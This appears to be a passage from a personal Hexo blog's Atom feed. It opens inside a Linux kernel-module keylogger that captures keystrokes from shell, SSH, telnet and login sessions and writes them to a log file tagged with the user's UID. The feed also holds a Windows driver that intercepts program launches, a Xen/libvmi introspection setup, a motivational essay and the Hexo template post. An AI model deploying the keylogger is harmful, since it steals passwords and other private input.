strcat(ibuffer,<span class="string">"[F11]"</span>);</div><div class="line">          //F12</div><div class="line">          <span class="keyword">if</span> (buf[0] == 0x34)</div><div class="line">            strcat(ibuffer,<span class="string">"[F12]"</span>);</div><div class="line">  </div><div class="line">          counter++;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">  </div><div class="line">      <span class="keyword">if</span>(counter &gt;= 4) &#123;  //WatchDog</div><div class="line">        counter = 0;</div><div class="line">        goto END;</div><div class="line">      &#125;</div><div class="line">  </div><div class="line">      counter ++;</div><div class="line">      goto END;</div><div class="line">    &#125;</div><div class="line">  </div><div class="line">    /*SH, SSHD = 0 /TELNETD = 3/LOGIN = 4*/</div><div class="line">    <span class="keyword">if</span>(r==1 &amp;&amp; (fd==0||fd==3||fd==4))&#123;</div><div class="line">      //CTRL+U</div><div class="line">      <span class="keyword">if</span>(buf[0]==0x15)&#123; </div><div class="line">        ibuffer[0]=<span class="string">'\0'</span>;</div><div class="line">        goto END;</div><div class="line">      &#125;</div><div class="line">      //TAB</div><div class="line">      <span class="keyword">if</span>(buf[0]==0x09)&#123;</div><div class="line">        strcat(ibuffer,<span class="string">"[TAB]"</span>);</div><div class="line">        counter = 0;</div><div class="line">        goto END;</div><div class="line">      &#125;</div><div class="line">      //CTRL+C</div><div class="line">      <span class="keyword">if</span>(buf[0]==0x03)&#123;</div><div class="line">        strcat(ibuffer,<span class="string">"[CTRL+C]"</span>);</div><div class="line">        counter = 0;</div><div class="line">        goto END;</div><div class="line">      &#125;</div><div class="line">      //CTRL+D</div><div class="line">      <span class="keyword">if</span>(buf[0]==0x03)&#123;</div><div class="line">        strcat(ibuffer,<span class="string">"[CTRL+D]"</span>);</div><div class="line">        counter = 0;</div><div class="line">        goto END;</div><div class="line">      &#125;</div><div class="line">      //CTRL+]</div><div class="line">      <span class="keyword">if</span>(buf[0]==0x1D)&#123;</div><div class="line">        strcat(ibuffer,<span class="string">"[CTRL+]]"</span>);</div><div class="line">        counter = 0;</div><div class="line">        goto END;</div><div class="line">      &#125;</div><div class="line">      //BACKSPACE 0x7F Local / 0x08 Remote</div><div class="line">      <span class="keyword">if</span> (buf[0] == 0x7F || buf[0] == 0x08) &#123;</div><div class="line">        <span class="keyword">if</span> (ibuffer[strlen(ibuffer) - 1] == <span class="string">']'</span>) &#123;</div><div class="line">          <span class="keyword">for</span> (i=2;strlen(ibuffer);i++)&#123;</div><div class="line">            <span class="keyword">if</span> (ibuffer[strlen (ibuffer) - i] == <span class="string">'['</span>) &#123;</div><div class="line">              ibuffer[strlen(ibuffer) - i] = <span class="string">'\0'</span>;</div><div class="line">              <span class="built_in">break</span>;</div><div class="line">            &#125;</div><div class="line">          &#125;</div><div class="line">          goto END;</div><div class="line">        &#125;<span class="keyword">else</span> &#123;</div><div class="line">          ibuffer[strlen(ibuffer) - 1] = <span class="string">'\0'</span>;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">  </div><div class="line">      <span class="keyword">if</span> (buf[0] == 0x1B) &#123;</div><div class="line">        counter++;</div><div class="line">        goto END;</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">if</span>(buf[0] != <span class="string">'\n'</span> &amp;&amp; buf[0] != <span class="string">'\r'</span>)&#123;</div><div class="line">        strncat(ibuffer,buf,sizeof(ibuffer));</div><div class="line">      &#125;<span class="keyword">else</span>&#123;</div><div class="line">        strcat(ibuffer,<span class="string">"\n"</span>);</div><div class="line">        get_time(date_time);</div><div class="line">        snprintf(obuffer,sizeof(obuffer),<span class="string">"[%s] - [UID = %i ] %s &gt; %s"</span>,date_time,current_uid(),current-&gt;comm,ibuffer);</div><div class="line">//I don<span class="string">'t want to log buffer more than 60 chars, most of them are useless data</span></div><div class="line"><span class="string">        if(strlen(ibuffer)&lt;60) &#123;</span></div><div class="line"><span class="string">          log_to_file(obuffer);</span></div><div class="line"><span class="string">        &#125;</span></div><div class="line"><span class="string">        ibuffer[0]='</span>\0<span class="string">';</span></div><div class="line"><span class="string">      &#125;</span></div><div class="line"><span class="string">    &#125;</span></div><div class="line"><span class="string">  &#125;</span></div><div class="line"><span class="string">  END:</span></div><div class="line"><span class="string">  return r;</span></div><div class="line"><span class="string">&#125;</span></div></pre></td></tr></table></figure><p>Welcome to communicate: <a href="https://762131828@qq.com" target="_blank" rel="external">Server</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;First define an array of 64 elements that need to hide the process prefix [MAX_PREFIX]&lt;br&gt;Then define a filldir hook () function (ps: fir
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2017/09/19/new%206/"/>
    <id>http://yoursite.com/2017/09/19/new 6/</id>
    <published>2017-09-19T00:59:26.197Z</published>
    <updated>2017-09-19T01:06:54.228Z</updated>
    
    <content type="html"><![CDATA[<hr><h2 id="What-is-the-most-deadly-gap"><a href="#What-is-the-most-deadly-gap" class="headerlink" title="What is the most deadly gap?"></a>What is the most deadly gap?</h2><p>Angela Lee is a math teacher in a public school in the United States, she found a strange phenomenon -</p><p>IQ high student achievement is not necessarily good, on the contrary, many IQ is not so high students but achieved good results.</p><p>In other words, IQ is not the only criterion for determining success and failure.</p><p>Later, Angela Lee returned to the University to pursue a master’s degree in psychology, began to systematically study “what ultimately determines whether a person is successful?”</p><p>They investigated the officers of the West Point, senior teachers, and sold the elite … and found that they had a common feature.</p><p>This feature is not a beautiful appearance, not social ability, not a strong physique, nor is it a high IQ.Is perseverance.</p><h2 id="first-find-the-reason"><a href="#first-find-the-reason" class="headerlink" title="first:find the reason"></a>first:find the reason</h2><h3 id="At-present-the-most-effective-way-to-cultivate-perseverance-is-Stanford-University-Carol-Dweck-proposed-“growth-thinking”"><a href="#At-present-the-most-effective-way-to-cultivate-perseverance-is-Stanford-University-Carol-Dweck-proposed-“growth-thinking”" class="headerlink" title="At present the most effective way to cultivate perseverance is Stanford University Carol Dweck proposed “growth thinking”"></a>At present the most effective way to cultivate perseverance is Stanford University Carol Dweck proposed “growth thinking”</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">At present the most effective way to cultivate perseverance is Stanford University Carol Dweck proposed <span class="string">"growth thinking"</span></div></pre></td></tr></table></figure><p>The core idea of growth thinking is that human learning ability can be changed.</p><p>In contrast, “fixed thinking” is that people’s talent is born.</p><p>In the face of setbacks and failures, these two kinds of thinking will lead directly to the two results -</p><p>Fixed thinking people think that this is their own limit, back to the days of weakness, so choose to give up;</p><p>Growing thinking people think that if you work harder, you can do better.</p><p>The former as a failure as the end of the world, the latter as a challenge to failure and learning opportunities.</p><p>The most deadly gap is the way of thinking.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">### Second:Growth thinking does not believe in fatalism.</div><div class="line"></div><div class="line">``` bash</div><div class="line">Growth thinking does not believe in fatalism.</div><div class="line"></div><div class="line">&quot;You are not going to go to college with this kind of IQ.&quot; &quot;I&apos;ll take a few more times.&quot;</div><div class="line"></div><div class="line">&quot;How can your family be so poor and how can you start?&quot; &quot;Money I can earn.&quot;</div><div class="line"></div><div class="line">&quot;You can not catch the girl.&quot; &quot;The first chase.&quot;</div><div class="line"></div><div class="line">Compared with the results, more concerned about the process;</div><div class="line"></div><div class="line">Compared with the failure, more concerned about the accumulated experience;</div><div class="line"></div><div class="line">This is the growth of thinking, do not believe that &quot;people&apos;s life, day is doomed&quot;, but always keep the development, keep making progress.</div></pre></td></tr></table></figure><h3 id="Third"><a href="#Third" class="headerlink" title="Third"></a>Third</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">Son of mathematics <span class="built_in">test</span> 59 points, he stood <span class="keyword">in</span> front of his father, head down, tightly holding the papers.</div><div class="line"></div><div class="line">Dad can say: <span class="string">"how can you even pass the exam can not, this life do not want to learn math!"</span></div><div class="line"></div><div class="line">Dad can also say: <span class="string">"wow, poor will be able to pass, the future immeasurable ah boy!"</span></div><div class="line"></div><div class="line">The first sentence, <span class="keyword">in</span> addition to his father vent their emotions, the child is not a little benefit.</div><div class="line"></div><div class="line">The child will only become increasingly skeptical of himself: I may not really learn the material</div><div class="line"></div><div class="line">The second sentence is to <span class="built_in">let</span> the children understand that he has been very close to the passing, the next time as long as more effort can become better.</div><div class="line"></div><div class="line">Consciously cultivating children<span class="string">'s growth thinking is extremely important, which allows them to more positive face of failure, rather than touch</span></div></pre></td></tr></table></figure><h3 id="Fourth-Change-the-way-you-speak-that-is-change-your-way-of-thinking"><a href="#Fourth-Change-the-way-you-speak-that-is-change-your-way-of-thinking" class="headerlink" title="Fourth:Change the way you speak, that is, change your way of thinking."></a>Fourth:Change the way you speak, that is, change your way of thinking.</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">1. <span class="string">"I do not understand what?"</span></div><div class="line"></div><div class="line"><span class="string">"I made a mistake."</span> Become <span class="string">"this mistake made me learn something."</span></div><div class="line"></div><div class="line"><span class="string">"It's too hard."</span> Become <span class="string">"I may need more effort."</span></div><div class="line"></div><div class="line">4. <span class="string">"Is it really my best thing?"</span></div><div class="line"></div><div class="line"><span class="string">"I can only do that."</span> <span class="string">"I can try again."</span></div><div class="line"></div><div class="line"><span class="string">"I can never be as clever as he is."</span> Become <span class="string">"I should learn from him."</span></div><div class="line"></div><div class="line"><span class="string">"I'm not too good at this."</span> Become <span class="string">"I'm improving."</span></div><div class="line"></div><div class="line"><span class="string">"I gave up."</span> <span class="string">"I'd better try other ways."</span></div></pre></td></tr></table></figure><h3 id="Fifth；Only-in-the-case-of-despair-we-will-choose-to-give-up"><a href="#Fifth；Only-in-the-case-of-despair-we-will-choose-to-give-up" class="headerlink" title="Fifth；Only in the case of despair, we will choose to give up"></a>Fifth；Only in the case of despair, we will choose to give up</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">People who have fixed thinking are more likely to have despair <span class="keyword">in</span> their failure, so they are more likely to choose to give up.</div><div class="line"></div><div class="line">People who have grown mind think of life as a continuous process, every failure as a stepping stone, will not give up, so they are more likely to be successful.</div><div class="line"></div><div class="line">Know there is a question and answer is very exciting,</div><div class="line"></div><div class="line">Asked, <span class="string">"how to get out of the haze of life?"</span></div><div class="line"></div><div class="line">Answer, <span class="string">"take a few more steps."</span></div></pre></td></tr></table></figure><p>More info: <a href="http://mp.weixin.qq.com/s?__biz=MjM5Mzk0OTI2MA==&amp;mid=2650571632&amp;idx=1&amp;sn=53ea9cae463779b63d8241248778450b&amp;chksm=be87105389f0994599d4a697a33a4c2d8f5de460357bf793a18fa8f1a60bc8dab65dc7100e30&amp;mpshare=1&amp;scene=23&amp;srcid=0919NB7BbDvelTwRARwTFShx#rd" target="_blank" rel="external">crazy reading</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h2 id=&quot;What-is-the-most-deadly-gap&quot;&gt;&lt;a href=&quot;#What-is-the-most-deadly-gap&quot; class=&quot;headerlink&quot; title=&quot;What is the most deadly gap?&quot;&gt;&lt;/a
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Pocess</title>
    <link href="http://yoursite.com/2017/09/18/new5/"/>
    <id>http://yoursite.com/2017/09/18/new5/</id>
    <published>2017-09-18T10:59:07.781Z</published>
    <updated>2017-09-18T10:59:07.783Z</updated>
    
    <content type="html"><![CDATA[<p>What is a rootkit? It is estimated that many friends do not understand, simply said, Rootkit is a special kind of malicious software, its function is<br>In the installation of the target to hide their own and specify the documents, processes and network links and other information, more common is the rootkit generally and wood<br>Horse, back door and other malicious programs used in combination. Rootkit by loading a special driver, modify the system kernel, and then to hide the letter<br>The purpose of interest. Technology is a double-edged sword, we study it is the purpose, through our research, with this technology to protect our system,<br>So that our system more robust, give full play to the positive application of this technology.</p><h2 id="Process-monitoring"><a href="#Process-monitoring" class="headerlink" title="Process monitoring"></a>Process monitoring</h2><h3 id="Create-a-new-drive"><a href="#Create-a-new-drive" class="headerlink" title="Create a new drive"></a>Create a new drive</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div></pre></td><td class="code"><pre><div class="line">ULONG __stdcall check(PULONG arg)//获得指向服务参数指针</div><div class="line">&#123;</div><div class="line"></div><div class="line">  HANDLE hand=0;PFILE_OBJECT file=0;</div><div class="line"></div><div class="line">  POBJECT_HANDLE_INFORMATION info=0;ULONG a;char*buff;</div><div class="line">  ANSI_STRING str; LARGE_INTEGER li;li.QuadPart=-10000;</div><div class="line"></div><div class="line"><span class="keyword">if</span>((arg[4]&amp;0xf0)==0)<span class="built_in">return</span> 1;//检测标志</div><div class="line"><span class="keyword">if</span>((arg[5]&amp;0x01000000)==0)<span class="built_in">return</span> 1;//检测属性</div><div class="line"></div><div class="line"></div><div class="line">//通过文件句柄获得文件名</div><div class="line">hand=(HANDLE)arg[6];//获得执行文件句柄</div><div class="line"></div><div class="line">ObReferenceObjectByHandle(hand,0,0,KernelMode,&amp;file,info);//&amp;file获得对象体指针</div><div class="line"><span class="keyword">if</span>(!file)<span class="built_in">return</span> 1;</div><div class="line"></div><div class="line">RtlUnicodeStringToAnsiString(&amp;str,&amp;file-&gt;FileName,1);</div><div class="line"></div><div class="line">a=str.Length;buff=str.Buffer;</div><div class="line"></div><div class="line"><span class="keyword">while</span>(1)//通过循环判断是不是有<span class="string">". "</span>标志</div><div class="line">&#123;</div><div class="line">  </div><div class="line"><span class="keyword">if</span>(buff[a]==<span class="string">'.'</span>)</div><div class="line">&#123;a++;<span class="built_in">break</span>;&#125;</div><div class="line"></div><div class="line">  a--;</div><div class="line"></div><div class="line">&#125;</div><div class="line">ObDereferenceObject(file);</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span>(_stricmp(&amp;buff[a],<span class="string">"exe"</span>))&#123;RtlFreeAnsiString(&amp;str);<span class="built_in">return</span> 1;&#125;//判断是否为可执行文件</div><div class="line"></div><div class="line"></div><div class="line"> </div><div class="line">KeWaitForSingleObject(&amp;event,Executive,KernelMode,0,0);//将当前线程置于等待状态知道信号态</div><div class="line"></div><div class="line"></div><div class="line">strcpy(&amp;output[8],buff);//将string复制进buff</div><div class="line">RtlFreeAnsiString(&amp;str);</div><div class="line"></div><div class="line">a=1;//用户的决定通过a的制来反映</div><div class="line">memmove(&amp;output[0],&amp;a,4);</div><div class="line"><span class="keyword">while</span>(1)</div><div class="line">&#123;</div><div class="line">KeDelayExecutionThread(KernelMode,0,&amp;li);//在一个固定时间间隔内当前线程处于等待状态</div><div class="line">memmove(&amp;a,&amp;output[0],4);</div><div class="line"><span class="keyword">if</span>(!a)<span class="built_in">break</span>;</div><div class="line">&#125;</div><div class="line">memmove(&amp;a,&amp;output[4],4);</div><div class="line"></div><div class="line">KeSetEvent(&amp;event,0,0);</div><div class="line"></div><div class="line"><span class="built_in">return</span> a;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">//保存执行文件上下文，调用check()函数</div><div class="line">_declspec(naked) Proxy()</div><div class="line">&#123;</div><div class="line"></div><div class="line">_asm&#123;</div><div class="line"></div><div class="line">pushfd</div><div class="line">pushad</div><div class="line">mov ebx,esp</div><div class="line"></div><div class="line">add ebx,40</div><div class="line">push ebx</div><div class="line"></div><div class="line">call check</div><div class="line"></div><div class="line">cmp eax,1//由check()的返回值判断是否让可执行文件继续执行</div><div class="line">jne block</div><div class="line"></div><div class="line"></div><div class="line">popad</div><div class="line">popfd</div><div class="line">jmp RealCallee//通过，调用ntcreatesection</div><div class="line"></div><div class="line"></div><div class="line">block:popad</div><div class="line">mov ebx, dword ptr[esp+8]</div><div class="line"></div><div class="line">mov dword ptr[ebx],0</div><div class="line">mov eax,0xC0000022L//不让其通过，返回STATUS_ACCESS_DENIED</div><div class="line">popfd</div><div class="line">ret 32</div><div class="line"></div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">到此，驱动程序的工作基本完成，所以在用户程序中用到一个线程来等待驱动的判断结果。</div><div class="line"> char*name=(char*)&amp;outputbuff[8];</div><div class="line"></div><div class="line">        <span class="keyword">for</span>(x=0;x&lt;stringcount;x++)</div><div class="line"></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span>(!stricmp(name,strings[x]))&#123;a=1;goto skip;&#125;</div><div class="line"></div><div class="line">        &#125;</div><div class="line">        strcpy(msgbuff, <span class="string">"Do you want to run "</span>);</div><div class="line">        strcat(msgbuff,&amp;outputbuff[8]);</div><div class="line"></div><div class="line">        </div><div class="line">        <span class="keyword">if</span>(IDYES==MessageBox(0, msgbuff,<span class="string">"WARNING"</span>,</div><div class="line">           MB_YESNO|MB_ICONQUESTION|0x00200000L))</div><div class="line"></div><div class="line">        &#123;a=1; strings[stringcount]=_strdup(name);stringcount++;&#125;</div><div class="line">        <span class="keyword">else</span> a=0;</div><div class="line">    </div><div class="line">        // write response to the buffer, and driver will get it</div><div class="line">        skip:memmove(&amp;outputbuff[4],&amp;a,4);</div><div class="line"></div><div class="line">        //让驱动继续</div><div class="line">        a=0;</div><div class="line">        memmove(&amp;outputbuff[0],&amp;a,4);</div><div class="line">&#125;&#125;</div></pre></td></tr></table></figure><p>More info: <a href="https://baike.baidu.com/item/rootkit/6356777?fr=aladdin" target="_blank" rel="external">Rootkit</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;What is a rootkit? It is estimated that many friends do not understand, simply said, Rootkit is a special kind of malicious software, its
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Virtualization monitoring process</title>
    <link href="http://yoursite.com/2017/09/17/new%204/"/>
    <id>http://yoursite.com/2017/09/17/new 4/</id>
    <published>2017-09-17T09:03:02.957Z</published>
    <updated>2017-09-17T21:43:20.701Z</updated>
    
    <content type="html"><![CDATA[<p>With the popularity of cloud computing, virtual machine introspection techniques and tools are increasingly being used to monitor the behavior of virtual machines in the IaaS cloud. With the help of these technologies, many applications can be installed outside the virtual machine, but also can provide services for the virtual machine, such as security monitoring software, virus detection software. But the technology must overcome a problem, the semantic gap: the management program can see the city state and their virtual machine within the expression of the semantic separation. This article focuses on the use of introspection technology to monitor the kernel process and the days of stepping on the various pit.</p><h2 id="Introduction-Doc"><a href="#Introduction-Doc" class="headerlink" title="Introduction Doc"></a>Introduction Doc</h2><h3 id="install-xen-on-the-ubuntu"><a href="#install-xen-on-the-ubuntu" class="headerlink" title="install xen on the ubuntu"></a>install xen on the ubuntu</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install virt-manager</div><div class="line">$ sudo apt-get install xen-hypervisor-amd64</div><div class="line">$ sudo reboot</div><div class="line">$ sudo xl list(Check <span class="keyword">if</span> the installation is successful)</div></pre></td></tr></table></figure><p>Site of docu: <a href="https://xenserver.org/" target="_blank" rel="external">Xen</a></p><h3 id="The-virtual-machine-is-created-to-run"><a href="#The-virtual-machine-is-created-to-run" class="headerlink" title="The virtual machine is created to run"></a>The virtual machine is created to run</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$ sudo apt-get update</div><div class="line">$ sudo apt-get -y install virt-manager qemu-system</div><div class="line">$ There is no need <span class="keyword">for</span> instructions here, as to download ubuntu system</div><div class="line">Attention：The default is to create a virtual machine under QEMU / KVM, but we need to create a virtual machine under xen, as follows</div><div class="line">Click on the file to create a new connectionThen, create a new virtual machine: self-add system iso file, install the virtual system, </div><div class="line">I installed is ubuntu14.04: (after testing, only ubuntu14.04 behind it can be monitored)</div><div class="line">The The The In the creation of virtual machines, we used the 2048M ram 2 cpu! The The</div><div class="line">installation. The The The The The The The The</div><div class="line">And <span class="keyword">then</span> <span class="built_in">type</span> the <span class="built_in">command</span> line $ sudo xl list on dom0, you can see xen monitor the two systems:</div></pre></td></tr></table></figure><p>More info: <a href="http://www.ubuntu.org.cn/index_kylin" target="_blank" rel="external">Ubuntu</a></p><h3 id="libvmi-variant-installation"><a href="#libvmi-variant-installation" class="headerlink" title="libvmi variant installation"></a>libvmi variant installation</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">1 sudo apt-get install libglib2.0-dev</div><div class="line">./autogen.sh</div><div class="line">If Error: could not find libtoolize or glibtoolize</div><div class="line">Solve: sudo apt-get install libtool</div><div class="line">2 ./autogen.sh</div><div class="line">  ./configure</div><div class="line">If missing xenstore</div><div class="line">Solve:sudo apt-get install libxen-dev... ...</div><div class="line">you just need to install whats the packge you need!</div><div class="line">sudo apt-get install check</div><div class="line">./autogen.sh</div><div class="line">./configure</div><div class="line"></div><div class="line">Last:View the files under libvmi-0.10.1 / example</div><div class="line">If you can find process-list、process-list.c、process-list.o,<span class="keyword">then</span> congratulation to you <span class="keyword">for</span> that you are successful!</div></pre></td></tr></table></figure><p>More info: As each person’s computer situation is different, the installation process has different problems, welcome to ask, I will solve for everyone!<br>More info: <a href="http://libvmi.com/" target="_blank" rel="external">libvmi</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Formula: * p = p-pid;</div></pre></td></tr></table></figure><p>More info: According to the various versions of the operating system data structure Xie wrote the main function of the module and Makfile file<br>Formula: * p = p-pid;<br>Also perform a file to view the kernel data structure of the various defined macros as well as the operation<br>More info: <a href="http://blog.csdn.net/geekcome/article/details/6196044" target="_blank" rel="external">CSDN</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;With the popularity of cloud computing, virtual machine introspection techniques and tools are increasingly being used to monitor the beh
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2017/09/13/hello-world/"/>
    <id>http://yoursite.com/2017/09/13/hello-world/</id>
    <published>2017-09-13T06:04:39.929Z</published>
    <updated>2017-09-13T06:04:39.929Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
  </entry>
  
</feed>
